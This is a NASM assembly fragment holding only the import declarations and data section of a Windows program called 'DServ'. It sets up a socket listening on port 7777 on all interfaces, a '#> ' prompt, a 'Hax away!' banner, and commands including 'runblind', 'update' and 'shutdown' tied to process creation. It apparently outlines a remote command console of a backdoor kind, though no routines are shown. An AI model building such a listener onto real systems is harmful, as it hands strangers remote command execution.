%include "C:\\nasm\\INC\\win32n.inc"

%macro CREATE_IMPORT 2
  extern %1
  import %1 %2
%endmacro

;----Kernel32 imports----
CREATE_IMPORT ExitProcess, kernel32.dll
CREATE_IMPORT Sleep, kernel32.dll
CREATE_IMPORT CreateProcessA, kernel32.dll

;----User32 imports----
CREATE_IMPORT MessageBoxA, user32.dll

;----Winsock imports----
CREATE_IMPORT WSAStartup, wsock32.dll
CREATE_IMPORT WSACleanup, wsock32.dll
CREATE_IMPORT WSAGetLastError, wsock32.dll
CREATE_IMPORT socket, wsock32.dll
CREATE_IMPORT setsockopt, wsock32.dll
CREATE_IMPORT bind, wsock32.dll
CREATE_IMPORT closesocket, wsock32.dll
CREATE_IMPORT accept, wsock32.dll
CREATE_IMPORT send, wsock32.dll
CREATE_IMPORT recv, wsock32.dll
CREATE_IMPORT listen, wsock32.dll
CREATE_IMPORT htons, wsock32.dll

;----C run-time library----
;CREATE_IMPORT strlen, msvcrtd.dll

;------------------------;
;Data
;------------------------;
segment .data USE32

CMD1           db 'quit',0
CMD2           db 'help',0
CMD3           db 'ping',0
CMD4           db 'shutdown',0
CMD5           db 'update',0
CMD6           db 'runblind',0
CMD7           db 'echo',0
CMDStrings     dd CMD1,     CMD2,     CMD3,     CMD4,         CMD5,       CMD6,         CMD7,0
CMDLabels      dd CMD_Quit, CMD_Help, CMD_Ping, CMD_Shutdown, CMD_Update, CMD_RunBlind, CMD_Echo,0

sockError      db 'Error initializing sockets.',0
title          db 'DServ',0

cmdPrompt      db '#> ',0
cmdPromptSize  equ $-cmdPrompt
pong           db 'Pong!', 0xD, 0xA,0
pongSize       equ $-pong
quit           db 'Quitting dserv console...', 0xD, 0xA,0
quitSize       equ $-quit
loginMsg       db 'Welcome to dserv. Hax away!', 0xD, 0xA, 0xD, 0xA,0
loginMsgSize   equ $-loginMsg
shutdown       db 'Shutting down dserv...', 0xD, 0xA,0
shutdownSize   equ $-shutdown
runSuccess     db 'Ran command successfully.', 0xD, 0xA,0
runSuccessSize equ $-runSuccess
runError       db 'Error in running command.', 0xD, 0xA,0
runErrorSize   equ $-runError
executing      db 'Executing...', 0xD, 0xA,0
executingSize  equ $-executing

noCmdError     db 'No such command.', 0xD, 0xA, 'Type "help" for help.', 0xD, 0xA,0
noCmdErrorSize equ $-noCmdError
invalidError   db 'You supplied invalid data for parsing.', 0xD, 0xA, 'Type "help" for help.', 0xD, 0xA,0
invalidErrorSize equ $-invalidError

;a buffer so we can send all data at once
buffer         resb 2048

crlf           db 0xD, 0xA,0
crlfSize       equ $-crlf
space          db 0x20,0
spaceSize      equ $-space

sockfd         dd 0x0
yes            dw 0x1

port           dw 7777 ;default port
server:
istruc sockaddr_in
  at sockaddr_in.sin_family, dw AF_INET
  at sockaddr_in.sin_port,   dw 0x0 ;set port later
  at sockaddr_in.sin_addr,   dd INADDR_ANY
  at sockaddr_in.sin_zero,   times 8 db 0 
iend

client:
istruc sockaddr_in
  at sockaddr_in.sin_family, dw AF_INET
  at sockaddr_in.sin_port,   dw 7777
  at sockaddr_in.sin_addr,   dd INADDR_ANY
  at sockaddr_in.sin_zero,   times 8 db 0 
iend

wsaData:
istruc WSAdata
  at WSAdata.wVersion,       dw 0
  at WSAdata.wHighVersion,   dw 0
  at WSAdata.szDescription,  times WSADESCRIPTION_LEN+1 db 0
  at WSAdata.szSystemStatus, times WSASYS_STATUS_LEN+1 db 0
  at WSAdata.iMaxSockets,    dw 0
  at WSAdata.iMaxUdpDg,      dw 0
  at WSAdata.lpVendorInfo,   dd 0
iend

processInfo:
istruc PROCESS_INFORMATION
  at PROCESS_INFORMATION.hProcess, dd 0
  at PROCESS_INFORMATION.hThread, dd 0
  at PROCESS_INFORMATION.dwProcessId, dd 0
  at PROCESS_INFORMATION.dwThreadId, dd 0
iend

startupInfo:
istruc STARTUPINFO
  at STARTUPINFO.cb, dd STARTUPINFO_size
  at STARTUPINFO.lpReserved, dd 0
  at STARTUPINFO.lpDesktop, dd 0
  at STARTUPINFO.lpTitle, dd 0
  at STARTUPINFO.dwX, dd 0
  at STARTUPINFO.dwY, dd 0
  at STARTUPINFO.dwXSize, dd 0
  at STARTUPINFO.dwYSize, dd 0
  at STARTUPINFO.dwXCountChars, dd 0
  at STARTUPINFO.dwYCountChars, dd 0
  at STARTUPINFO.dwFillAttribute, dd 0
  at STARTUPINFO.dwFlags, dd 0
  at STARTUPINFO.wShowWindow, dw 0
  at STARTUPINFO.cbReserved2, dw 0
  at STARTUPINFO.lpReserved2, db 0
  at STARTUPINFO.hStdInput, dd 0
  at STARTUPINFO.hStdOutput, dd 0
  at STARTUPINFO.hStdError, dd 0
iend
